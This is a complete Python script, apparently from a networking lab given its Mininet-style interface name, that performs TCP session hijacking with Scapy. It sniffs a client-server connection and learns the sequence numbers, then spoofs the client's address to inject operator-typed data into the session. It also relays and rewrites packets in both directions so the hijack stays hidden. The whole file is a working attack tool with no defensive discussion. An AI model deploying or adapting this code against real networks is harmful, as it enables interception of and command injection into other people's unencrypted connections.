#!/usr/bin/python3

import sys
import getopt
import threading
from scapy.all import *

class Hijack:
	def __init__(self, srv_port, srv_ip, my_mac, client_ip = None):
		self.dev = "h3-eth0"
		self.srv_port = srv_port
		self.srv_ip = srv_ip
		self.client_port = None
		self.client_ip = client_ip
		self.my_mac = my_mac

		self.my_seq = 0
		self.my_ack = 0
		self.my_offset = 0
		self.hijacked = False

	def input_loop(self):
		while True:
			inject_data = input(">> ")
			inject_data = inject_data + "\n"

			if not self.hijacked:
				print("아직 hijack 안 된 상태라 inject 못 보냄")
				continue

			seq = self.my_seq + self.my_offset
			print("inject 준비: seq=%d ack=%d offset=%d payload=%r" % (seq, self.my_ack, self.my_offset, inject_data))
			self.my_offset += len(inject_data)
			packet = IP(src=self.client_ip, dst=self.srv_ip) / TCP(sport=self.client_port, dport=self.srv_port, seq=seq, ack=self.my_ack, flags="PA") / inject_data
			send(packet, iface=self.dev, verbose=False)
			print("inject 전송 완료. 누적 offset=%d" % self.my_offset)


	def handle_packet(self, packet):
		ip = packet.getlayer("IP")
		tcp = packet.getlayer("TCP")
		flags = tcp.sprintf("%flags%")

		print("Got packet %s:%d -> %s:%d [%s] from %s" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags, packet["Ether"].src if packet.haslayer("Ether") else "?"))

		#Check if this is a hijackable packet
		if tcp.sprintf("%flags%") == "A" or tcp.sprintf("%flags%") == "PA":

			payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0

			if packet["Ether"].src == self.my_mac:
				print("내가 보낸 패킷이라 무시")
				return

			#The packet is from server to client
			elif tcp.sport == self.srv_port and ip.src == self.srv_ip and ip.dst == self.client_ip:
				print("server -> client 패킷:  seq=%d ack=%d payload_len=%d" % (tcp.seq, tcp.ack, payload_len))

				if not self.hijacked:
					self.client_ip = ip.dst
					self.client_port = tcp.dport
					self.my_seq = tcp.ack
					self.my_ack = tcp.seq + payload_len
					self.hijacked = True

					print("첫 캡처 - 세션 학습 완료: my_seq=%d my_ack=%d client_port=%d" % (self.my_seq, self.my_ack, self.client_port))
					print("Got server sequence " + str(tcp.seq))
					print("Got client sequence " + str(tcp.ack) + "\n")
					print("Hijacking %s:%d -> %s:%d" % (ip.dst, tcp.dport, ip.src, self.srv_port))
					print("Start sending message to the server")

					threading.Thread(target=self.input_loop, daemon=True).start()
				else:
					new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack - self.my_offset, flags=tcp.flags)
					if payload_len > 0:
						new_packet = new_packet / Raw(load=packet.getlayer("Raw").load)
						print("Received from server: " + packet.getlayer("Raw").load.decode())
						self.my_ack += payload_len
					send(new_packet, iface=self.dev, verbose=False)

			#The packet is from client to server
			elif tcp.sport == self.client_port and ip.src == self.client_ip and ip.dst == self.srv_ip:
				print("client -> server 패킷:  seq=%d ack=%d payload_len=%d" % (tcp.seq, tcp.ack, payload_len))
				if not self.hijacked:
					print("아직 hijack 안 됐으니 건너뜀")
					return

				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq + self.my_offset, ack=tcp.ack, flags=tcp.flags)
				if payload_len > 0:
					new_packet = new_packet / Raw(load=packet.getlayer("Raw").load)
					print("Received from client: " + packet.getlayer("Raw").load.decode())
					self.my_seq += payload_len
				send(new_packet, iface=self.dev, verbose=False)
		elif flags == "FA" or flags == "FPA":
			print("세션 종료 패킷 감지 (%s). 반대편으로 forward" % flags)

			if ip.src == self.srv_ip:
				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack - self.my_offset, flags=tcp.flags)
			else:
				new_packet = IP(src=ip.src, dst=ip.dst) / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq + self.my_offset, ack=tcp.ack, flags=tcp.flags)

			if packet.haslayer("Raw"):
				new_packet = new_packet / Raw(load=packet.getlayer("Raw").load)
			send(new_packet, iface=self.dev, verbose=False)

			print("FIN 전달 완료. 세션 초기화")
			self.my_seq = 0
			self.my_ack = 0
			self.my_offset = 0
			self.hijacked = False

	def run(self):
		if self.client_ip:
			print("Hijacking TCP connections from %s to %s on port %d" % (self.client_ip, self.srv_ip, self.srv_port))
			filter = "tcp and port " + str(self.srv_port) + " and host " + self.srv_ip + " and host " + self.client_ip
		else:
			print("Hijacking all TCP connections to %s on port %d" % (self.srv_ip, self.srv_port))
			filter =  "tcp and port " + str(self.srv_port) + " and host " + self.srv_ip

		sniff(iface=self.dev, store=0, filter=filter, prn=self.handle_packet)

def usage():
	print(sys.argv[0])
	print("""
	-c <client_ip> (optional)
	-s <srv_ip>
	-p <srv_port>
    -m <my_mac>
	""")
	sys.exit(1)

client_ip = None
srv_port = None
srv_ip = None
my_mac = None

try:
	cmd_opts = "c:s:p:m:"
	opts, args = getopt.getopt(sys.argv[1:], cmd_opts)

except getopt.GetoptError:
	usage()

for opt in opts:
	if opt[0] == "-c":
		client_ip = opt[1]
	elif opt[0] == "-s":
		srv_ip = opt[1]
	elif opt[0] == "-p":
		srv_port = int(opt[1])
	elif opt[0] == "-m":
		my_mac = opt[1]
	else:
		usage()

if not srv_ip or not srv_port or not my_mac:
	usage()

Hijack(srv_port, srv_ip, my_mac, client_ip).run()
